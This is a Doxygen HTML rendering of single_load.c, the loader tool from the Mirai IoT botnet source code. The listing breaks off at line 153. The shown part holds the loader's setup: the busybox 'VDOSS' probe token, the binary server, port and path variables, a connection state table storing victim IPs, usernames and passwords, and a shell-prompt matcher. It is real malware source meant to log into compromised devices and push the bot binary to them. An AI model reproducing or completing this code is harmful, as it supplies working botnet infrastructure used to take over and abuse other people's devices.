<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/tools/single_load.c Source File</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('single__load_8c_source.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="headertitle">
<div class="title">single_load.c</div>  </div>
</div><!--header-->
<div class="contents">
<a href="single__load_8c.html">Go to the documentation of this file.</a><div class="fragment"><div class="line"><a name="l00001"></a><span class="lineno"><a class="line" href="single__load_8c.html#a369266c24eacffb87046522897a570d5">    1</a></span>&#160;<span class="preprocessor">#define _GNU_SOURCE</span></div><div class="line"><a name="l00002"></a><span class="lineno">    2</span>&#160;</div><div class="line"><a name="l00003"></a><span class="lineno">    3</span>&#160;<span class="preprocessor">#include &lt;assert.h&gt;</span></div><div class="line"><a name="l00004"></a><span class="lineno">    4</span>&#160;<span class="preprocessor">#include &lt;stdio.h&gt;</span></div><div class="line"><a name="l00005"></a><span class="lineno">    5</span>&#160;<span class="preprocessor">#include &lt;stdlib.h&gt;</span></div><div class="line"><a name="l00006"></a><span class="lineno">    6</span>&#160;<span class="preprocessor">#include &lt;stdarg.h&gt;</span></div><div class="line"><a name="l00007"></a><span class="lineno">    7</span>&#160;<span class="preprocessor">#include &lt;unistd.h&gt;</span></div><div class="line"><a name="l00008"></a><span class="lineno">    8</span>&#160;<span class="preprocessor">#include &lt;string.h&gt;</span></div><div class="line"><a name="l00009"></a><span class="lineno">    9</span>&#160;<span class="preprocessor">#include &lt;sys/socket.h&gt;</span></div><div class="line"><a name="l00010"></a><span class="lineno">   10</span>&#160;<span class="preprocessor">#include &lt;netinet/in.h&gt;</span></div><div class="line"><a name="l00011"></a><span class="lineno">   11</span>&#160;<span class="preprocessor">#include &lt;signal.h&gt;</span></div><div class="line"><a name="l00012"></a><span class="lineno">   12</span>&#160;<span class="preprocessor">#include &lt;sys/time.h&gt;</span></div><div class="line"><a name="l00013"></a><span class="lineno">   13</span>&#160;<span class="preprocessor">#include &lt;sys/types.h&gt;</span></div><div class="line"><a name="l00014"></a><span class="lineno">   14</span>&#160;<span class="preprocessor">#include &lt;fcntl.h&gt;</span></div><div class="line"><a name="l00015"></a><span class="lineno">   15</span>&#160;<span class="preprocessor">#include &lt;ctype.h&gt;</span></div><div class="line"><a name="l00016"></a><span class="lineno">   16</span>&#160;<span class="preprocessor">#include &lt;errno.h&gt;</span></div><div class="line"><a name="l00017"></a><span class="lineno">   17</span>&#160;<span class="preprocessor">#include &lt;arpa/inet.h&gt;</span></div><div class="line"><a name="l00018"></a><span class="lineno">   18</span>&#160;<span class="preprocessor">#include &lt;netinet/ip.h&gt;</span></div><div class="line"><a name="l00019"></a><span class="lineno">   19</span>&#160;<span class="preprocessor">#include &lt;netinet/tcp.h&gt;</span></div><div class="line"><a name="l00020"></a><span class="lineno">   20</span>&#160;<span class="preprocessor">#include &lt;pthread.h&gt;</span></div><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;<span class="preprocessor">#include &lt;sys/queue.h&gt;</span></div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;<span class="preprocessor">#include &lt;sys/epoll.h&gt;</span></div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;<span class="preprocessor">#include &lt;glob.h&gt;</span></div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;</div><div class="line"><a name="l00026"></a><span class="lineno"><a class="line" href="single__load_8c.html#a5c3a83864bf5991d09aa5c2abb911bf0">   26</a></span>&#160;<span class="preprocessor">#define TOKEN           &quot;/bin/busybox VDOSS&quot;</span></div><div class="line"><a name="l00027"></a><span class="lineno"><a class="line" href="single__load_8c.html#aa2b7fda41691fd8bf8cdfb06ca803451">   27</a></span>&#160;<span class="preprocessor">#define TOKEN_VERIFY    &quot;applet not found&quot;</span></div><div class="line"><a name="l00028"></a><span class="lineno"><a class="line" href="single__load_8c.html#ab329b58cd4ae81a2957abb47bc37dcf5">   28</a></span>&#160;<span class="preprocessor">#define EXEC_VERIFY     &quot;YESHELLO&quot;</span></div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;</div><div class="line"><a name="l00030"></a><span class="lineno"><a class="line" href="single__load_8c.html#aba6226c3e69f3896f4c1749d4b21c157">   30</a></span>&#160;<span class="preprocessor">#define BYTES_PER_LINE      128</span></div><div class="line"><a name="l00031"></a><span class="lineno"><a class="line" href="single__load_8c.html#a6644330df8211610c4f8bbf11ff711d0">   31</a></span>&#160;<span class="preprocessor">#define CHARS_PER_BYTE      5</span></div><div class="line"><a name="l00032"></a><span class="lineno"><a class="line" href="single__load_8c.html#a012fc0d9c1397d1166fad67f36216256">   32</a></span>&#160;<span class="preprocessor">#define MAX_SLICE_LENGTH    (BYTES_PER_LINE * CHARS_PER_BYTE)</span></div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;</div><div class="line"><a name="l00034"></a><span class="lineno"><a class="line" href="single__load_8c.html#a40ea84f37bdd97a9380f0b0689cb9f6f">   34</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">char</span> *<a class="code" href="single__load_8c.html#a40ea84f37bdd97a9380f0b0689cb9f6f">bind_ip</a> = <span class="stringliteral">&quot;0.0.0.0&quot;</span>;</div><div class="line"><a name="l00035"></a><span class="lineno"><a class="line" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">   35</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="single__load_8c.html#a4225ca72f2fd6918ee211c80bbeb4799">debug_mode</a> = 0;</div><div class="line"><a name="l00036"></a><span class="lineno"><a class="line" href="single__load_8c.html#a777a368ac9880f35191fd558c620c1ea">   36</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a777a368ac9880f35191fd558c620c1ea">maxConnectedSockets</a> = 0;</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;</div><div class="line"><a name="l00038"></a><span class="lineno"><a class="line" href="single__load_8c.html#a99169136d6396257b7564d360ddb1b3e">   38</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">char</span> *<a class="code" href="single__load_8c.html#a99169136d6396257b7564d360ddb1b3e">bin_server</a> = NULL;</div><div class="line"><a name="l00039"></a><span class="lineno"><a class="line" href="single__load_8c.html#a8da4fb95d90c2d188241f358748ff05c">   39</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">short</span> <a class="code" href="single__load_8c.html#a8da4fb95d90c2d188241f358748ff05c">bin_port</a> = NULL;</div><div class="line"><a name="l00040"></a><span class="lineno"><a class="line" href="single__load_8c.html#a96eec5f5fffb2e552b7241dca3c2dca8">   40</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">char</span> *<a class="code" href="single__load_8c.html#a96eec5f5fffb2e552b7241dca3c2dca8">bin_path</a> = NULL;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;</div><div class="line"><a name="l00042"></a><span class="lineno"><a class="line" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">   42</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#acbdcadfc9f254fc3f06dc6ed0d39c3c6">running_threads</a> = 0;</div><div class="line"><a name="l00043"></a><span class="lineno"><a class="line" href="single__load_8c.html#ade3fd107ea730977ea13ae06f11a466a">   43</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code" href="single__load_8c.html#ade3fd107ea730977ea13ae06f11a466a">found_srvs</a> = 0;</div><div class="line"><a name="l00044"></a><span class="lineno"><a class="line" href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">   44</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#ae9c69edc71ec3e55ed54dfe5ec400b3b">bytes_sent</a> = 0;</div><div class="line"><a name="l00045"></a><span class="lineno"><a class="line" href="single__load_8c.html#a9ae97c4e98713a8e03d2dc33d07248d5">   45</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code" href="single__load_8c.html#a9ae97c4e98713a8e03d2dc33d07248d5">timed_out</a> = 0;</div><div class="line"><a name="l00046"></a><span class="lineno"><a class="line" href="single__load_8c.html#a9f642299723fd19fc3fb895d2709ea79">   46</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code" href="single__load_8c.html#a9f642299723fd19fc3fb895d2709ea79">login_done</a> = 0;</div><div class="line"><a name="l00047"></a><span class="lineno"><a class="line" href="single__load_8c.html#afa54e717c52681c4ee6722efed32e67f">   47</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code" href="single__load_8c.html#afa54e717c52681c4ee6722efed32e67f">failed_connect</a> = 0;</div><div class="line"><a name="l00048"></a><span class="lineno"><a class="line" href="single__load_8c.html#a132912f867b9c79296731cc953db0e0d">   48</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code" href="single__load_8c.html#a132912f867b9c79296731cc953db0e0d">remote_hangup</a> = 0;</div><div class="line"><a name="l00049"></a><span class="lineno"><a class="line" href="single__load_8c.html#ac7b080a6c9a6f86019eb3acd7c6ac075">   49</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">short</span> <a class="code" href="single__load_8c.html#ac7b080a6c9a6f86019eb3acd7c6ac075">port</a> = 0;</div><div class="line"><a name="l00050"></a><span class="lineno"><a class="line" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">   50</a></span>&#160;<span class="keyword">volatile</span> <span class="keywordtype">unsigned</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a> = 0;</div><div class="line"><a name="l00051"></a><span class="lineno"><a class="line" href="single__load_8c.html#ac891ccd192d22a97ec092f7d888237ab">   51</a></span>&#160;FILE *<a class="code" href="single__load_8c.html#ac891ccd192d22a97ec092f7d888237ab">infd</a>;</div><div class="line"><a name="l00052"></a><span class="lineno"><a class="line" href="single__load_8c.html#a3ade46bb9591205f4fa0b1daf0641f84">   52</a></span>&#160;<span class="keywordtype">char</span> *<a class="code" href="single__load_8c.html#a3ade46bb9591205f4fa0b1daf0641f84">run_arg</a> = NULL;</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;</div><div class="line"><a name="l00054"></a><span class="lineno"><a class="line" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">   54</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>;</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;</div><div class="line"><a name="l00056"></a><span class="lineno"><a class="line" href="structstateSlot__t.html">   56</a></span>&#160;<span class="keyword">struct </span><a class="code" href="structstateSlot__t.html">stateSlot_t</a></div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;{</div><div class="line"><a name="l00058"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">   58</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">slotUsed</a>;</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;    </div><div class="line"><a name="l00060"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">   60</a></span>&#160;    pthread_mutex_t <a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;    </div><div class="line"><a name="l00062"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a0a912afe1412b83a1a360e2e366cb49f">   62</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#a0a912afe1412b83a1a360e2e366cb49f">success</a>;</div><div class="line"><a name="l00063"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">   63</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">is_open</a>;</div><div class="line"><a name="l00064"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">   64</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">special</a>;</div><div class="line"><a name="l00065"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">   65</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">got_prompt</a>;</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;    </div><div class="line"><a name="l00067"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">   67</a></span>&#160;    uint8_t <a class="code" href="structstateSlot__t.html#ab4d619ac04c7c52d3acc5872d8e46d18">pathInd</a>;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;    </div><div class="line"><a name="l00069"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">   69</a></span>&#160;    uint16_t <a class="code" href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">echoInd</a>;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;    </div><div class="line"><a name="l00071"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#aef0c0771a735aa97966f56ca13c5318a">   71</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#aef0c0771a735aa97966f56ca13c5318a">complete</a>;</div><div class="line"><a name="l00072"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a663b34074eb9f5b50b34379824d6b58e">   72</a></span>&#160;    uint32_t <a class="code" href="structstateSlot__t.html#a663b34074eb9f5b50b34379824d6b58e">ip</a>;</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;    </div><div class="line"><a name="l00074"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">   74</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>;</div><div class="line"><a name="l00075"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">   75</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">updatedAt</a>;</div><div class="line"><a name="l00076"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a41ba546ff5566fb42a81bf13f15476c9">   76</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="structstateSlot__t.html#a41ba546ff5566fb42a81bf13f15476c9">reconnecting</a>;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;    </div><div class="line"><a name="l00078"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">   78</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a>;</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;    </div><div class="line"><a name="l00080"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">   80</a></span>&#160;    <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">path</a>[5][32];</div><div class="line"><a name="l00081"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">   81</a></span>&#160;    <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">username</a>[32];</div><div class="line"><a name="l00082"></a><span class="lineno"><a class="line" href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">   82</a></span>&#160;    <span class="keywordtype">char</span> <a class="code" href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">password</a>[32];</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;};</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;<span class="keyword">struct</span></div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;{</div><div class="line"><a name="l00087"></a><span class="lineno"><a class="line" href="single__load_8c.html#ab3224925b39807938f827a0562819482">   87</a></span>&#160;    <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#ab3224925b39807938f827a0562819482">num_slices</a>;</div><div class="line"><a name="l00088"></a><span class="lineno"><a class="line" href="single__load_8c.html#a7b5dd1f48db83f53473fd67f032334fe">   88</a></span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> **<a class="code" href="single__load_8c.html#a7b5dd1f48db83f53473fd67f032334fe">slices</a>;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;} <a class="code" href="single__load_8c.html#a57abc471d40878085782a301e7543803">binary</a>;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;</div><div class="line"><a name="l00091"></a><span class="lineno"><a class="line" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">   91</a></span>&#160;<span class="keyword">struct </span><a class="code" href="structstateSlot__t.html">stateSlot_t</a> <a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[1024 * 100] = {0};</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;<span class="keyword">extern</span> <span class="keywordtype">float</span> <a class="code" href="single__load_8c.html#a8c1a8db0710bb3f25f643a0fca68fc60">ceilf</a> (<span class="keywordtype">float</span> <a class="code" href="enc_8c.html#aa880e16f83b9fba77f7b9cb8ab81a6fe">x</a>);</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;</div><div class="line"><a name="l00095"></a><span class="lineno"><a class="line" href="single__load_8c.html#a9ae6cc04b42a7e7c08e115f2a0eea899">   95</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#a9ae6cc04b42a7e7c08e115f2a0eea899">diff</a>(<span class="keywordtype">int</span> val)</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;{</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;    <span class="keywordflow">return</span> (val &gt; 0) ? val : 0;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;}</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;</div><div class="line"><a name="l00100"></a><span class="lineno"><a class="line" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">  100</a></span>&#160;<span class="keywordtype">int</span> <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(<span class="keywordtype">char</span> *bufStr)</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;{</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;    <span class="keywordtype">int</span> i = 0, q = 0;</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;    <span class="keywordtype">char</span> *prompts = <span class="stringliteral">&quot;:&gt;%$#&quot;</span>;</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;    </div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;    <span class="keywordtype">char</span> *tmpStr = malloc(strlen(bufStr) + 1);</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;    memset(tmpStr, 0, strlen(bufStr) + 1);</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;    </div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;    <span class="comment">// ayy lmao copy pasta for removing ansi shit</span></div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;    <span class="keywordtype">char</span> in_escape = 0;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; strlen(bufStr); i++)</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;    {</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;        <span class="keywordflow">if</span> (bufStr[i] == <span class="stringliteral">&#39;\x1B&#39;</span>)</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;        {</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;            <span class="keywordflow">if</span> (in_escape == 0) </div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;                in_escape = 1;</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;        } <span class="keywordflow">else</span> <span class="keywordflow">if</span> ((in_escape == 1) &amp;&amp; (strchr(<span class="stringliteral">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span>, bufStr[i]) != NULL))</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;        {</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;            in_escape = 0;</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;        } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (in_escape == 0) </div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        {</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;            strncat(tmpStr, &amp;(bufStr[i]), 1);</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;        }</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;    }</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;    </div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;    <span class="keywordtype">int</span> bufLen = strlen(tmpStr);</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;    <span class="keywordflow">for</span>(i = 0; i &lt; strlen(prompts); i++)</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;    {</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;        <span class="keywordflow">while</span>(bufLen &gt; q &amp;&amp; (*(tmpStr + bufLen - q) == 0x00 || *(tmpStr + bufLen - q) == <span class="charliteral">&#39; &#39;</span> || *(tmpStr + bufLen - q) == <span class="charliteral">&#39;\r&#39;</span> || *(tmpStr + bufLen - q) == <span class="charliteral">&#39;\n&#39;</span>)) q++;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;        </div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;        <span class="keywordflow">if</span>(*(tmpStr + bufLen - q) == prompts[i])</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;        {</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;            <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(tmpStr);</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;            <span class="keywordflow">return</span> 1;</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;        }           </div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;    }</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;    </div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;    <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(tmpStr);</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;    <span class="keywordflow">return</span> 0;</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;}</div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;</div><div class="line"><a name="l00141"></a><span class="lineno"><a class="line" href="single__load_8c.html#af1bddd272ab58d596235a98a58df8c46">  141</a></span>&#160;<span class="keywordtype">void</span> <a class="code" href="single__load_8c.html#af1bddd272ab58d596235a98a58df8c46">hexDump</a>(<span class="keywordtype">char</span> *desc, <span class="keywordtype">void</span> *addr, <span class="keywordtype">int</span> len)</div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;{</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> buff[17];</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> *pc = (<span class="keywordtype">unsigned</span> <span class="keywordtype">char</span>*)addr;</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;    <span class="keywordflow">if</span> (desc != NULL) printf (<span class="stringliteral">&quot;%s:\n&quot;</span>, desc);</div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; len; i++) {</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;        <span class="keywordflow">if</span> ((i % 16) == 0)</div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;        {</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;            <span class="keywordflow">if</span> (i != 0) printf (<span class="stringliteral">&quot;  %s\n&quot;</span>, buff);</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;            printf (<span class="stringliteral">&quot;  %04x &quot;</span>, i);</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        }</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;        printf (<span class="stringliteral">&quot; 